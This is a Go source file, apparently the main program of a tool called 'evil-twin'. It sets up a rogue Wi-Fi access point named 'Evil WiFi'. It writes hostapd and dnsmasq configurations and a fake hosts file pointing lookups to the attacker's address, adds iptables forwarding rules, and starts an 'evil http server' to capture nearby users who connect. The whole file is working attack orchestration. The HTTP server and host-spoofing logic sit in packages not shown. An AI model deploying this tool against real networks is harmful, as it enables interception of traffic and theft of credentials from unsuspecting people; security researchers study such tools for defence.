package main

import (
	"fmt"
	"os"
	"os/signal"
	"time"

	"github.com/stevenaldinger/evil-twin/internal/pkg/files"
	"github.com/stevenaldinger/evil-twin/internal/pkg/ip"
	"github.com/stevenaldinger/evil-twin/internal/pkg/commands"
	"github.com/stevenaldinger/evil-twin/internal/pkg/httpserver"
)

func main() {
	// gives everything a chance to stop properly even after commands are canceled
	defer func() {
		time.Sleep(10000 * time.Millisecond)
	}()

	hostapdFilePath := "conf/hostapd.conf"
	dnsmasqFilePath := "conf/dnsmasq.conf"
	fakeHostsFilePath := "conf/fake_hosts.conf"
	interfaceName := "wlan1"
	internetInterfaceName := "wlan0"
	listAddr := "0.0.0.0"
	// cidr needs to be the same as the dnsmasq config
	cidr := "10.0.0.0/24"
	netmask := "255.255.255.0"

	hostapdVariables := &files.HostAPDVariables{
		Interface: interfaceName,
		SSID: "Evil WiFi",
		Channel: "6",
		CountryCode: "BO",
	}

	dnsmasqVariables := &files.DnsmasqVariables{
		Interface: interfaceName,
		ListenAddress: listAddr,
	}

	fakeHostsVariables := &files.FakeHostsVariables{
		IP: "10.0.0.1",
	}

	fmt.Println("Generating necessary config files...")
	// fmt.Println("Writing conf/hostapd.conf file...")
	files.WriteHostAPDConfFile(hostapdFilePath, hostapdVariables)

	// fmt.Println("Writing conf/dnsmasq.conf file...")
	files.WriteDNSMasqConfFile(dnsmasqFilePath, dnsmasqVariables)

	files.WriteFakeHostsFile(fakeHostsFilePath, fakeHostsVariables)

	files.EnsureInterfaceUnmanaged(interfaceName)

	firstIP := ip.FindAvailableIPInCIDR(cidr)

	if err := ip.AssignIPAddress(interfaceName, firstIP, netmask); err != nil {
		fmt.Println("Error occured assigning IP...", err)
	}
	// else {
	// 	fmt.Println("Successfully assigned " + firstIP + " to " + interfaceName)
	// }

	fmt.Println("Adding iptables rules...")
	ip.AddIPTablesRules(interfaceName, internetInterfaceName)

	fmt.Println("Starting evil http server...")
	go httpserver.Serve()

	time.Sleep(2000 * time.Millisecond)

	fmt.Println("Starting DNS server...")
	dnsMasqCmd := commands.RunDNSMasq()

	time.Sleep(2000 * time.Millisecond)
	fmt.Println("Starting access point...")
	hostAPDCmd := commands.RunHostAPD()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)

	go func(){
    // for sig := range c {
    for _ = range c {
        // sig is a ^C, handle it
			fmt.Println("")
			fmt.Println("Gracefully stopping...")

			go func(){
				fmt.Println("Stopping dnsmasq...")
				commands.CancelCommand(dnsMasqCmd, "dnsmasq")
			}()

			go func(){
				fmt.Println("Stopping hostapd...")
				commands.CancelCommand(hostAPDCmd, "hostapd")
			}()

			go func(){
				fmt.Println("Deleting iptables rules...")
				ip.DeleteIPTablesRules(interfaceName, internetInterfaceName)
			}()


			time.Sleep(3000 * time.Millisecond)

			fmt.Println("Restoring backup config...")
			files.RestoreBackupConf()

			os.Exit(0)
    }
	}()

	fmt.Println("")
	fmt.Println("Hit ctrl+c at any point to gracefully shutdown...")
	fmt.Println("")
	fmt.Println("🔥😈🔥 Evil Access Point is ready 🔥😈🔥")

	// these will wait indefinitely
	dnsMasqCmd.Wait()
	hostAPDCmd.Wait()
}
